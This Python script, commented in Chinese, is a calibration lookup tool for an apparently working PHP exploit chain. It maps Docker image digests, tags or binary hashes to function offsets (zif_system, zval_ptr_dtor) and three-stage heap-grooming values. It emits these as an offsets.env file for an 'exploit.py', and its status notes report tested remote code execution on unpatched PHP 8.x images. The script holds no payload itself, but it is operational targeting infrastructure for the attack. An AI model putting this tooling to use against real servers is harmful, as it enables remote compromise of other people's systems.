#!/usr/bin/env python3
"""标定表查询器 —— 用镜像 digest / tag 查 exploit 需要的偏移与堆标定。

    python3 calibrate/calib_lookup.py --list
    python3 calibrate/calib_lookup.py --digest sha256:47e6d884...
    python3 calibrate/calib_lookup.py --tag php:8.5.11-apache --env
    python3 calibrate/calib_lookup.py --md > /tmp/table.md

--env 直接输出 exploit.py 能吃的 offsets.env：
    python3 calibrate/calib_lookup.py --tag php:8.5.11-apache --env > out/offsets.env

查不到时按 tag 的版本号给"同构建族"建议，退出码 1 表示未标定。
"""

from __future__ import annotations

import argparse
import json
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
TABLE = os.path.join(os.path.dirname(HERE), "calibration.json")

STATUS_NOTE = {
    "exploitable": "可利用（三个 stage 全通，实测 RCE）",
    "patched": "已修复（8.5.12/8.4.27/8.3.36/8.2.35 系列），链不通，仅留符号备查",
    "broken": "有漏洞但链不适用（7.4 语义不同）",
    "unverified": "符号已采，运行未验证",
}


def load() -> dict:
    with open(TABLE, encoding="utf-8") as f:
        return json.load(f)


def _digest_match(entry: dict, needle: str) -> bool:
    needle = needle.strip()
    if not needle:
        return False
    bare = needle.split("@")[-1]
    hexpart = bare.split(":", 1)[-1]
    for field in ("repo_digest", "image_id"):
        val = entry.get(field) or ""
        if not val:
            continue
        if val == needle or val.split("@")[-1] == bare:
            return True
        # 允许只给后 12 位以上的 hex 片段
        valhex = val.split(":", 1)[-1]
        if len(hexpart) >= 6 and (valhex.startswith(hexpart)
                                  or hexpart.startswith(valhex[:len(hexpart)])
                                  or hexpart in valhex):
            return True
    return False


def find_binary(table: dict, needle: str) -> dict | None:
    needle = (needle or "").strip().lower()
    if not needle:
        return None
    for b in table.get("binaries", []):
        sha = (b.get("sha256") or "").lower()
        if not sha:
            continue
        if sha == needle or (len(needle) >= 8 and sha.startswith(needle)):
            return b
        if needle in (b.get("binary") or "").lower():
            return b
    return None


def describe_binary(b: dict) -> str:
    lines = [
        f"binary          {b.get('binary')}",
        f"php_version     {b.get('php_version')}",
        f"source          {b.get('source')}",
        f"sha256          {b.get('sha256')}",
        f"symbols         {'stripped（无 .symtab）' if b.get('stripped') else '有 .symtab'}",
        f"zif_system      {b.get('zif_system')}",
        f"zval_ptr_dtor   {b.get('zval_ptr_dtor')}",
        f"delta(dtor->zif) {b.get('delta_dtor_to_zif')}",
        f"zif 怎么来的    {b.get('zif_source', '—')}",
        f"怎么验证的      {b.get('verified_by', '—')}",
        f"堆标定          {b.get('heap', '—')}",
    ]
    return "\n".join(lines)


def find(table: dict, digest: str = "", tag: str = "") -> dict | None:
    if digest:
        for e in table["images"]:
            if _digest_match(e, digest):
                return e
    if tag:
        exact = [e for e in table["images"] if e.get("tag") == tag]
        if exact:
            return exact[0]
        ver = tag.split(":")[-1].split("-")[0]
        for e in table["images"]:
            if e.get("php_version") == ver:
                return e
    return None


def describe(e: dict) -> str:
    heap = e.get("heap") or {}
    lines = [
        f"tag             {e.get('tag')}",
        f"php_version     {e.get('php_version')}",
        f"repo_digest     {e.get('repo_digest') or '(本地构建，无 digest)'}",
        f"image_id        {e.get('image_id')}",
        f"status          {e.get('status')}  -- {STATUS_NOTE.get(e.get('status'), '')}",
        f"zif_system      {e.get('zif_system')}",
        f"zval_ptr_dtor   {e.get('zval_ptr_dtor')}",
        f"delta(dtor->zif) {e.get('delta_dtor_to_zif')}",
        f"heap.profile    {heap.get('profile')}",
        f"heap.htdata     {heap.get('htdata') if isinstance(heap.get('htdata'), str) else hex(heap.get('htdata', 0))}",
        f"heap.stage1_n   {heap.get('stage1_n')}",
        f"heap.stage2_t   {heap.get('stage2_t')}",
        f"heap.stage2_v   {heap.get('stage2_v')}",
        f"heap.stage3_pads {heap.get('stage3_pads')}",
        f"verified        {e.get('verified')}"
        + ("  (flaky: 重试可达，不是偏移错)" if e.get("flaky") else ""),
    ]
    att = (e.get("evidence") or {}).get("attempts") or []
    if att:
        lines.append("attempts        " + "; ".join(
            f"{'ok' if a.get('ok') else 'fail'} {a.get('elapsed_s')}s {a.get('marker', '')[:40]}".strip()
            for a in att))
    if e.get("notes"):
        lines.append(f"notes           {e['notes']}")
    return "\n".join(lines)


def markdown(table: dict) -> str:
    """和 CALIBRATION.md 用的是同一个渲染器（build_table.row），保证两处不打架。"""
    sys.path.insert(0, HERE)
    import build_table  # noqa: E402  (同目录)
    rows = ["| PHP | 镜像 tag | digest | `zif_system` | `zval_ptr_dtor` | delta | 堆标定 | 状态 | 实测 |",
            "|---|---|---|---|---|---|---|---|---|"]
    rows += [build_table.row(e) for e in table["images"]]
    return "\n".join(rows)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--digest", default="")
    ap.add_argument("--tag", default="")
    ap.add_argument("--binary", default="", help="按二进制 sha256 / 文件名查（非镜像目标）")
    ap.add_argument("--env", action="store_true", help="输出 offsets.env 格式")
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--md", action="store_true", help="输出 markdown 表")
    args = ap.parse_args()

    if not os.path.exists(TABLE):
        print(f"缺少标定表 {TABLE}", file=sys.stderr)
        return 2
    table = load()

    if args.md:
        print(markdown(table))
        return 0
    if args.binary:
        b = find_binary(table, args.binary)
        if not b:
            print(f"未标定的二进制: {args.binary}", file=sys.stderr)
            return 1
        if args.env:
            print(f"ZIF_OFFSET={b['zif_system']}")
            print(f"DTOR_OFFSET={b['zval_ptr_dtor']}")
            return 0
        print(describe_binary(b))
        return 0
    if args.list or not (args.digest or args.tag or args.binary):
        for e in table["images"]:
            print(f"{e.get('php_version'):<10} {e.get('status'):<12} "
                  f"{e.get('zif_system'):<12} {e.get('zval_ptr_dtor'):<12} "
                  f"{e.get('repo_digest') or '(本地构建)'}")
        for b in table.get("binaries", []):
            print(f"{b.get('php_version'):<10} {'binary':<12} "
                  f"{b.get('zif_system'):<12} {b.get('zval_ptr_dtor'):<12} "
                  f"{b.get('binary')} (sha256:{(b.get('sha256') or '')[:16]}…)")
        return 0

    e = find(table, args.digest, args.tag)
    if not e:
        print(f"未标定: digest={args.digest or '-'} tag={args.tag or '-'}", file=sys.stderr)
        return 1
    if args.env:
        if e.get("status") != "exploitable":
            print(f"# 警告: {e.get('tag')} 状态 {e.get('status')}，链不通"
                  f"（{STATUS_NOTE.get(e.get('status'), '')}）", file=sys.stderr)
        print(f"ZIF_OFFSET={e['zif_system']}")
        print(f"DTOR_OFFSET={e['zval_ptr_dtor']}")
        return 0
    print(describe(e))
    return 0


if __name__ == "__main__":
    sys.exit(main())
